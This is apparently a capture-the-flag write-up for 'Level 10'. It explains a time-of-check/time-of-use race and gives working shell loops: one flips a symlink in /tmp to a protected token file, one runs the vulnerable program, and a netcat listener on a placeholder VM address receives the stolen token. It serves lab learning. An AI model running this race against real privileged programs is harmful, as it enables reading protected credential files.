# Level 10

Classic TOCTOU race.

Program checks access first, then uses the file later. If you swap target between those moments, you can win.

I used 3 terminals.

Listener:

```bash
nc -lk 6969
```

Symlink flipper:

```bash
while true; do
  echo 'ok' > /tmp/file
  rm -f /tmp/file
  ln -s /home/user/level10/token /tmp/file
  rm -f /tmp/file
done
```

Trigger loop:

```bash
while true; do
  ./level10 /tmp/file <VM_IP>
done
```

When timing hits, token lands in the nc terminal.
